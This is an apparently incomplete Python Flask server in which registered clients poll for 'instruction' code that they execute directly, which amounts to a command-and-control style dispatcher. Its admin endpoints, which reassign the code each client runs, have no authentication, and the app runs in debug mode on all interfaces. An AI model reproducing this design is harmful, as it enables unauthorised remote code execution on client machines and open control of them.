#!/usr/bin/python
import os
import sys
import json
import logging
import threading
import time
import shutil
import traceback
import marshal
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template, redirect, url_for, session, send_file
import zipfile
from io import BytesIO
import textwrap

# Försök importera CORS, men fortsätt även om det misslyckas
try:
    from flask_cors import CORS
    has_cors = True
except ImportError:
    has_cors = False
    print("Warning: flask_cors not found. Cross-origin requests will be blocked.")

# Import instructions for clients
from instructions import INSTRUCTIONS

# Base directory setup
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOG_DIRECTORY = os.path.join(BASE_DIR, "data", "logs")
CLIENT_LOGS_DIRECTORY = os.path.join(LOG_DIRECTORY, "clients")
STATIC_DIRECTORY = os.path.join(BASE_DIR, "static")
TEMPLATES_DIRECTORY = os.path.join(BASE_DIR, "templates")
CONFIG_DIRECTORY = os.path.join(BASE_DIR, "config")
INDEX_FILE = os.path.join(LOG_DIRECTORY, "client_index.json")
PING_STATUS_FILE = os.path.join(LOG_DIRECTORY, "ping_status.json")
ADMIN_CREDENTIALS_FILE = os.path.join(CONFIG_DIRECTORY, "admin_credentials.json")
ALL_IN_LOG_FILE = os.path.join(LOG_DIRECTORY, "allin.log")

# Constants
ONLINE_THRESHOLD_MINUTES = 5
AUTO_PING_INTERVAL = 60  # seconds

# Initialize the Flask application
app = Flask(__name__, 
            static_url_path='/static', 
            static_folder=STATIC_DIRECTORY,
            template_folder=TEMPLATES_DIRECTORY)

# Apply CORS only if available
if has_cors:
    CORS(app)
else:
    logging.warning("flask_cors not available - CORS support disabled")

# Session key for Flask
app.secret_key = os.urandom(24)

# Ensure log directories exist
os.makedirs(LOG_DIRECTORY, exist_ok=True)
os.makedirs(CLIENT_LOGS_DIRECTORY, exist_ok=True)

# Setup logging - Regular application logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(LOG_DIRECTORY, "server.log")),
        logging.StreamHandler(sys.stdout)
    ]
)

# Setup detailed all-in-one logging for client communications
allin_logger = logging.getLogger('allin')
allin_logger.setLevel(logging.DEBUG)

# Remove any existing handlers to avoid duplicate logs
for handler in allin_logger.handlers[:]:
    allin_logger.removeHandler(handler)

# Create a file handler for the all-in-one logger with explicit path
allin_handler = logging.FileHandler(ALL_IN_LOG_FILE)
allin_handler.setLevel(logging.DEBUG)
allin_formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s')
allin_handler.setFormatter(allin_formatter)
allin_logger.addHandler(allin_handler)

# Add stdout handler to see logs in console too
allin_stdout_handler = logging.StreamHandler(sys.stdout)
allin_stdout_handler.setFormatter(allin_formatter)
allin_logger.addHandler(allin_stdout_handler)

# Log file paths at startup for debugging
logging.info(f"Log directory: {LOG_DIRECTORY}")
logging.info(f"All-in-one log file: {ALL_IN_LOG_FILE}")

# Global variables for auto-ping thread
auto_ping_thread = None
auto_ping_running = False

def log_client_communication(direction, client_id, endpoint, data, status_code=None):
    """Log detailed client communication data to allin.log"""
    try:
        log_message = f"DIRECTION: {direction} | "
        log_message += f"CLIENT: {client_id} | "
        log_message += f"ENDPOINT: {endpoint} | "
        
        if status_code is not None:
            log_message += f"STATUS: {status_code} | "
        
        if data:
            if isinstance(data, bytes):
                log_message += f"DATA: [Binary data of length {len(data)}]"
            elif isinstance(data, dict) or isinstance(data, list):
                try:
                    log_message += f"DATA: {json.dumps(data)}"
                except:
                    log_message += f"DATA: {str(data)} (JSON serialization failed)"
            else:
                log_message += f"DATA: {str(data)}"
        else:
            log_message += "DATA: None"
            
        # Log to allin logger
        allin_logger.debug(log_message)
        
        # Also log to main logger for consistency
        logging.debug(f"CLIENT-COMM: {log_message}")
    except Exception as e:
        logging.error(f"Error in logging client communication: {str(e)}")
        logging.debug(traceback.format_exc())

# ... keep existing code (user authentication and client status functionality)

@app.route("/api/register", methods=["POST"])
def api_register():
    """API för klientregistrering."""
    client_data = {}
    ip_address = request.remote_addr
    
    logging.debug(f"Registreringsförfrågan från {ip_address} med data: {request.get_data(as_text=True)}")
    
    try:
        if request.is_json:
            client_data = request.get_json()
        else:
            # Försök att parsa form data
            client_data = request.form.to_dict()
        
        # Log incoming request details
        log_client_communication("IN", client_data.get("id", "unknown"), 
                                "/api/register", client_data)
        
        # Verifiera nödvändig data
        if not client_data or not client_data.get("id"):
            logging.warning(f"Ogiltig registreringsförfrågan från {ip_address}: Inget ID tillhandahållet")
            return jsonify({"status": "error", "message": "Client ID krävs"}), 400
        
        client_id = client_data.get("id")
        logging.info(f"Registrerar klient {client_id} från IP {ip_address}")
        
        # Säkerställ att loggkataloger finns
        os.makedirs(CLIENT_LOGS_DIRECTORY, exist_ok=True)
        os.makedirs(os.path.dirname(INDEX_FILE), exist_ok=True)
        
        # Läs befintligt index om det finns
        client_index = {}
        if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
            try:
                with open(INDEX_FILE, "r", encoding="utf-8") as f:
                    client_index = json.load(f) or {}
            except Exception as e:
                logging.error(f"Fel vid läsning av client_index.json: {e}")
                client_index = {}
        
        # Skapa eller uppdatera klientdata
        if client_id in client_index:
            logging.info(f"Uppdaterar befintlig klient {client_id}")
            # Bevara vissa befintliga värden
            existing_data = client_index[client_id]
            # Uppdatera med ny data
            for key, value in client_data.items():
                # Uppdatera bara specifika fält, behåll annat
                if key not in ["last_activity", "first_seen"]:
                    existing_data[key] = value
            # Uppdatera aktivitetstid
            existing_data["last_activity"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            existing_data["ip"] = ip_address
        else:
            logging.info(f"Skapar ny klient {client_id}")
            # Lägg till standard och infodata
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            client_data.update({
                "ip": ip_address,
                "first_seen": current_time,
                "last_activity": current_time,
                "instruction": client_data.get("instruction", "standard"),
                "is_active": True
            })
            client_index[client_id] = client_data
        
        # Spara uppdaterat index
        with open(INDEX_FILE, "w", encoding="utf-8") as f:
            json.dump(client_index, f, indent=4)
            
        logging.info(f"Klient {client_id} registrerad framgångsrikt")
        
        # Hämta aktiv instruktion att skicka tillbaka
        instruction_name = client_index[client_id].get("instruction", "standard")
        instruction_code = INSTRUCTIONS.get(instruction_name, INSTRUCTIONS["standard"])
        
        response_data = {
            "status": "success", 
            "message": f"Klient {client_id} registrerad", 
            "instruction": instruction_name,
            "code": instruction_code
        }
        
        # Log the response
        log_client_communication("OUT", client_id, "/api/register", response_data, 200)
        
        return jsonify(response_data)
            
    except Exception as e:
        logging.error(f"Fel vid registrering av klient: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        
        error_response = {
            "status": "error", 
            "message": f"Registreringsfel: {str(e)}"
        }
        
        # Log the error response
        log_client_communication("OUT", client_data.get("id", "unknown"), 
                               "/api/register", error_response, 500)
        
        return jsonify(error_response), 500

@app.route("/api/heartbeat/<client_id>", methods=["POST"])
def api_heartbeat(client_id):
    """API för klientheartbeat."""
    ip_address = request.remote_addr
    logging.debug(f"Heartbeat från klient {client_id} på IP {ip_address}")
    
    try:
        # Log incoming request
        additional_data = {}
        if request.is_json:
            additional_data = request.get_json()
        elif request.form:
            additional_data = request.form.to_dict()
            
        log_client_communication("IN", client_id, f"/api/heartbeat/{client_id}", additional_data)
        
        # Kontrollera om klienten finns, annars returnera fel
        client_index = {}
        if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
            with open(INDEX_FILE, "r", encoding="utf-8") as f:
                client_index = json.load(f) or {}
        
        if client_id not in client_index:
            logging.warning(f"Heartbeat för okänd klient {client_id}")
            error_response = {"status": "error", "message": "Okänd klient"}
            log_client_communication("OUT", client_id, f"/api/heartbeat/{client_id}", error_response, 404)
            return jsonify(error_response), 404
        
        # Uppdatera senaste aktivitet
        client_index[client_id]["last_activity"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_index[client_id]["ip"] = ip_address
        
        # Uppdatera andra fält om tillhandahållet
        for key, value in additional_data.items():
            if key not in ["id", "last_activity", "first_seen"]:
                client_index[client_id][key] = value
                
        # Spara uppdaterat index
        with open(INDEX_FILE, "w", encoding="utf-8") as f:
            json.dump(client_index, f, indent=4)
            
        logging.debug(f"Heartbeat uppdaterad för klient {client_id}")
        
        # Hämta aktiv instruktion att skicka tillbaka
        instruction_name = client_index[client_id].get("instruction", "standard")
        instruction_code = INSTRUCTIONS.get(instruction_name, INSTRUCTIONS["standard"])
        
        response_data = {
            "status": "success", 
            "message": "Heartbeat registrerad", 
            "instruction": instruction_name,
            "code": instruction_code
        }
        
        log_client_communication("OUT", client_id, f"/api/heartbeat/{client_id}", response_data, 200)
        
        return jsonify(response_data)
    
    except Exception as e:
        logging.error(f"Fel vid hantering av heartbeat för klient {client_id}: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        
        error_response = {"status": "error", "message": f"Heartbeat-fel: {str(e)}"}
        log_client_communication("OUT", client_id, f"/api/heartbeat/{client_id}", error_response, 500)
        
        return jsonify(error_response), 500

@app.route("/get_instructions", methods=["GET"])
def get_instructions():
    """Legacy API för att hämta instruktioner - returnerar raw text data."""
    client_id = request.args.get("client_id")
    
    if not client_id:
        logging.warning("Förfrågan om instruktioner utan klient-ID")
        return jsonify({"error": "client_id required"}), 400
    
    logging.info(f"Legacy instruktionsförfrågan från klient {client_id}")
    log_client_communication("IN", client_id, "/get_instructions", {"client_id": client_id})
    
    try:
        # Kontrollera om klienten finns
        client_index = {}
        if os.path.exists(INDEX_FILE):
            with open(INDEX_FILE, "r", encoding="utf-8") as f:
                client_index = json.load(f) or {}
        
        instruction_name = "standard"  # Default
        
        if client_id in client_index:
            instruction_name = client_index[client_id].get("instruction", "standard")
            # Uppdatera senaste aktivitet
            client_index[client_id]["last_activity"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(INDEX_FILE, "w", encoding="utf-8") as f:
                json.dump(client_index, f, indent=4)
        
        # Hämta instruktionskod
        instruction_code = INSTRUCTIONS.get(instruction_name, INSTRUCTIONS["standard"])
        
        # Skapa en enkel sträng som client kan exekvera direkt
        response_data = instruction_code.encode('utf-8')
        
        logging.info(f"Skickar raw instruktioner '{instruction_name}' till klient {client_id}")
        log_client_communication("OUT", client_id, "/get_instructions", 
                              f"Raw text data for instruction '{instruction_name}'", 200)
        
        # Returnera raw text data istället för marshal-kodad bytecode
        return response_data, 200, {"Content-Type": "text/plain"}
        
    except Exception as e:
        logging.error(f"Fel vid hantering av instruktionsförfrågan för klient {client_id}: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        
        error_response = {"error": str(e)}
        log_client_communication("OUT", client_id, "/get_instructions", error_response, 500)
        
        return jsonify(error_response), 500

# Add new API endpoints for the React frontend that match our scriptsService.ts

@app.route("/api/clients", methods=["GET"])
def get_clients():
    """API endpoint to get all clients."""
    try:
        logging.info("API request for all clients")
        
        # Read client index
        client_index = {}
        if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
            with open(INDEX_FILE, "r", encoding="utf-8") as f:
                client_index = json.load(f) or {}
        
        # Convert client data to array format expected by frontend
        clients_list = []
        for client_id, client_data in client_index.items():
            client_data["id"] = client_id
            clients_list.append(client_data)
        
        log_client_communication("OUT", "admin", "/api/clients", clients_list, 200)
        return jsonify(clients_list)
    
    except Exception as e:
        logging.error(f"Error handling clients request: {e}")
        logging.debug(f"Exception details: {traceback.format_exc()}")
        
        error_response = {"status": "error", "message": f"Error: {str(e)}"}
        log_client_communication("OUT", "admin", "/api/clients", error_response, 500)
        
        return jsonify(error_response), 500

@app.route("/api/instructions", methods=["GET"])
def get_all_instructions():
    """API endpoint to get all available instructions."""
    try:
        logging.info("API request for all instructions")
        
        instructions_dict = INSTRUCTIONS
        
        log_client_communication("OUT", "admin", "/api/instructions", instructions_dict, 200)
        return jsonify(instructions_dict)
    
    except Exception as e:
        logging.error(f"Error handling instructions request: {e}")
        logging.debug(f"Exception details: {traceback.format_exc()}")
        
        error_response = {"status": "error", "message": f"Error: {str(e)}"}
        log_client_communication("OUT", "admin", "/api/instructions", error_response, 500)
        
        return jsonify(error_response), 500

@app.route("/api/clients/<client_id>/instruction", methods=["PUT"])
def update_client_instruction(client_id):
    """API endpoint to update a client's instruction."""
    try:
        logging.info(f"API request to update instruction for client {client_id}")
        
        if not request.is_json:
            return jsonify({"status": "error", "message": "Request must be JSON"}), 400
        
        request_data = request.get_json()
        
        if not request_data or "instruction" not in request_data:
            return jsonify({"status": "error", "message": "Missing instruction field"}), 400
        
        instruction_id = request_data["instruction"]
        
        # Check if instruction exists
        if instruction_id not in INSTRUCTIONS:
            return jsonify({"status": "error", "message": f"Invalid instruction: {instruction_id}"}), 400
        
        # Read client index
        client_index = {}
        if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
            with open(INDEX_FILE, "r", encoding="utf-8") as f:
                client_index = json.load(f) or {}
        
        # Check if client exists
        if client_id not in client_index:
            return jsonify({"status": "error", "message": f"Client not found: {client_id}"}), 404
        
        # Update client instruction
        client_index[client_id]["instruction"] = instruction_id
        
        # Save updated index
        with open(INDEX_FILE, "w", encoding="utf-8") as f:
            json.dump(client_index, f, indent=4)
        
        logging.info(f"Updated instruction for client {client_id} to {instruction_id}")
        
        response_data = {
            "status": "success",
            "message": f"Instruction updated for client {client_id}",
            "client_id": client_id,
            "instruction": instruction_id
        }
        
        log_client_communication("OUT", client_id, f"/api/clients/{client_id}/instruction", response_data, 200)
        return jsonify(response_data)
    
    except Exception as e:
        logging.error(f"Error updating client instruction: {e}")
        logging.debug(f"Exception details: {traceback.format_exc()}")
        
        error_response = {"status": "error", "message": f"Error: {str(e)}"}
        log_client_communication("OUT", client_id, f"/api/clients/{client_id}/instruction", error_response, 500)
        
        return jsonify(error_response), 500

@app.route("/api/get_config", methods=["GET"])
def get_config():
    """API endpoint to get server configuration."""
    try:
        logging.info("API request for server configuration")
        
        config = {
            "server_version": "1.0.0",
            "api_version": "1.0",
            "allowed_instructions": list(INSTRUCTIONS.keys()),
            "ping_interval": AUTO_PING_INTERVAL,
            "online_threshold_minutes": ONLINE_THRESHOLD_MINUTES
        }
        
        log_client_communication("OUT", "admin", "/api/get_config", config, 200)
        return jsonify(config)
    
    except Exception as e:
        logging.error(f"Error handling config request: {e}")
        logging.debug(f"Exception details: {traceback.format_exc()}")
        
        error_response = {"status": "error", "message": f"Error: {str(e)}"}
        log_client_communication("OUT", "admin", "/api/get_config", error_response, 500)
        
        return jsonify(error_response), 500

# Serve static files for the frontend
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def serve_static(path):
    if path == "" or path == "/" or not os.path.exists(os.path.join(STATIC_DIRECTORY, path)):
        return send_file(os.path.join(STATIC_DIRECTORY, 'index.html'))
    return send_file(os.path.join(STATIC_DIRECTORY, path))

# Create necessary directories
@app.before_first_request
def create_directories():
    """Ensure all required directories exist."""
    os.makedirs(LOG_DIRECTORY, exist_ok=True)
    os.makedirs(CLIENT_LOGS_DIRECTORY, exist_ok=True)
    os.makedirs(CONFIG_DIRECTORY, exist_ok=True)
    os.makedirs(STATIC_DIRECTORY, exist_ok=True)
    os.makedirs(TEMPLATES_DIRECTORY, exist_ok=True)

# Run the server directly instead of using mod_wsgi
if __name__ == "__main__":
    # Create necessary directories
    os.makedirs(LOG_DIRECTORY, exist_ok=True)
    os.makedirs(CLIENT_LOGS_DIRECTORY, exist_ok=True)
    os.makedirs(CONFIG_DIRECTORY, exist_ok=True)
    os.makedirs(STATIC_DIRECTORY, exist_ok=True)
    os.makedirs(TEMPLATES_DIRECTORY, exist_ok=True)
    
    # Log startup information
    logging.info("Starting NEEA server...")
    logging.info(f"Server directory: {BASE_DIR}")
    logging.info(f"Log directory: {LOG_DIRECTORY}")
    
    # Run the Flask app
    app.run(host='0.0.0.0', port=8000, debug=True)
